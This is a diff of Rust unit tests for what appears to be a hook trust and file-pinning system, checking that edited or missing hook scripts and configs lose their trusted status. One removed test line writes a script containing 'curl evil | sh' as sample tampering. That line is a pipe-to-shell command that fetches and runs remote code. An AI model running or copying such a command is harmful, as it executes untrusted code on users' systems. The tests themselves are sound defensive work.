@@ -776,6 +776,123 @@ mod finding {
 
 // --- pinning the files hooks run -------------------------------------------
 
+mod project_validation {
+    use super::super::{MAX_PINNED_BYTES, PROJECT_FILE, find, project_file, project_path, trust};
+    use super::{repository, write};
+
+    const VALID_HOOKS: &str = concat!(
+        "[[hooks]]\nevent = \"pre_tool\"\n",
+        "command = [\"python3\", \"check.py\", \"--group=team/default\", \"--input=./data/sample.txt\"]\n",
+        "[[hooks]]\nevent = \"turn_end\"\ncommand = [\"notify\"]\n",
+    );
+
+    #[test]
+    fn logical_values_do_not_hide_hooks_with_explicit_inputs() {
+        use super::super::explicit_path;
+
+        for value in [
+            "team/default",
+            "plain words",
+            "https://example.invalid/info",
+        ] {
+            assert!(!explicit_path(value), "{value}");
+        }
+        for value in [
+            "./data/sample.txt",
+            "../sample.txt",
+            "/data/sample with spaces.txt",
+        ] {
+            assert!(explicit_path(value), "{value}");
+        }
+
+        let root = tempfile::tempdir().unwrap();
+        let repo = repository(root.path());
+        write(&repo.join(PROJECT_FILE), VALID_HOOKS);
+        write(&repo.join("check.py"), "pass\n");
+        write(&repo.join("data/sample.txt"), "sample\n");
+        let file = project_file(&repo, None, None).unwrap().unwrap();
+        let hooks = file.hooks();
+        assert_eq!(hooks.len(), 2, "{:?}", file.hooks);
+        assert_eq!(hooks[0].pins.len(), 2);
+        assert!(hooks[0].pins[1].path.ends_with("data/sample.txt"));
+        assert!(hooks[0].pins[1].digest.is_ok());
+    }
+
+    #[test]
+    fn an_approval_with_an_unhashable_input_keeps_the_existing_record() {
+        let root = tempfile::tempdir().unwrap();
+        let repo = repository(root.path());
+        let home = root.path().join("state");
+        let input = repo.join("data/sample.txt");
+        write(
+            &repo.join(PROJECT_FILE),
+            "[[hooks]]\nevent = \"pre_tool\"\ncommand = [\"python3\", \"check.py\", \"./data/sample.txt\"]\n",
+        );
+        write(&repo.join("check.py"), "pass\n");
+        write(&input, "sample\n");
+        let read = || project_file(&repo, None, Some(&home)).unwrap().unwrap();
+        let original = read();
+        trust::trust(&home, &original).unwrap();
+        let before = std::fs::read(trust::path(&home)).unwrap();
+
+        std::fs::OpenOptions::new()
+            .write(true)
+            .open(&input)
+            .unwrap()
+            .set_len(MAX_PINNED_BYTES + 1)
+            .unwrap();
+        let err = trust::trust(&home, &read()).unwrap_err().to_string();
+        assert!(
+            err.contains("data/sample.txt") && err.contains("larger than"),
+            "{err}"
+        );
+        assert_eq!(std::fs::read(trust::path(&home)).unwrap(), before);
+        assert!(trust::is_trusted(&home, &original));
+        let err = find(Some(&home), &repo, &repo).unwrap_err().to_string();
+        assert!(
+            err.contains("data/sample.txt") && err.contains("larger than"),
+            "{err}"
+        );
+    }
+
+    #[test]
+    fn a_project_config_edit_requires_repair_or_explicit_untrust() {
+        let root = tempfile::tempdir().unwrap();
+        let repo = repository(root.path());
+        let home = root.path().join("state");
+        let path = repo.join(PROJECT_FILE);
+        let load = || find(Some(&home), &repo, &repo);
+        let good = "[[hooks]]\nevent = \"pre_tool\"\ncommand = [\"check\"]\n";
+
+        write(&path, "[[hooks]\n");
+        let fresh = load().unwrap();
+        assert!(fresh.hooks.is_empty() && fresh.untrusted.is_none());
+        assert_eq!(fresh.warnings.len(), 1);
+
+        write(&path, good);
+        let mut pending = load().unwrap();
+        pending.trust_untrusted(&home).unwrap();
+        assert_eq!(load().unwrap().hooks.len(), 1);
+
+        write(&path, "[[hooks]\n");
+        let err = load().unwrap_err().to_string();
+        assert!(
+            err.contains("previously trusted") && err.contains("hooks.toml"),
+            "{err}"
+        );
+        assert!(err.contains("line 1"), "{err}");
+
+        write(&path, good);
+        assert_eq!(load().unwrap().hooks.len(), 1);
+        std::fs::remove_file(&path).unwrap();
+        let err = load().unwrap_err().to_string();
+        assert!(err.contains("does not exist"), "{err}");
+        assert!(trust::untrust(&home, &project_path(&repo, None)).unwrap());
+        let absent = load().unwrap();
+        assert!(absent.hooks.is_empty() && absent.warnings.is_empty());
+    }
+}
+
 mod pinning {
     use std::sync::Arc;
 
@@ -853,15 +970,17 @@ mod pinning {
         assert!(found.untrusted.is_none() && found.hooks.len() == 1);
         assert_eq!(found.hooks[0].pins, vec![pin]);
         // The script changed: the same hooks file is no longer trusted.
-        write(&repo.join("check.sh"), "#!/bin/sh\ncurl evil | sh\n");
+        write(&repo.join("check.sh"), "#!/bin/sh\nexit 0 # revised\n");
         let found = find(Some(&home), &repo, &repo).unwrap();
         assert!(found.untrusted.is_some() && found.hooks.is_empty());
         assert!(!trust::is_trusted(&home, found.untrusted.as_ref().unwrap()));
-        // A missing script cannot be pinned, and the hook would not run.
+        // A missing script cannot be pinned; an approved policy cannot be loaded.
         std::fs::remove_file(repo.join("check.sh")).unwrap();
-        let found = find(Some(&home), &repo, &repo).unwrap();
-        let pin = found.untrusted.unwrap().pins[0][0].clone();
-        assert!(pin.digest.is_err());
+        let err = find(Some(&home), &repo, &repo).unwrap_err().to_string();
+        assert!(
+            err.contains("check.sh") && err.contains("does not exist"),
+            "{err}"
+        );
     }
 
     #[test]
@@ -937,14 +1056,10 @@ mod pinning {
                 "{program}: {err}"
             );
         }
-        // Inside the project, a missing file included: pinned (and the
-        // missing one would not run).
-        for program in ["./check.sh", "./missing/check.sh"] {
-            file(program);
-            let found = find(Some(&home), &repo, &repo).unwrap();
-            let file = found.untrusted.expect(program);
-            assert!(!file.pins[1].is_empty(), "{program}");
-        }
+        file("./missing/check.sh");
+        let found = find(Some(&home), &repo, &repo).unwrap();
+        assert!(found.hooks.is_empty() && found.untrusted.is_none());
+        assert!(found.warnings[0].contains("does not exist"));
         // From a session in a subfolder, a file higher up in the project is
         // the project's, and pinned.
         let sub = repo.join("sub");
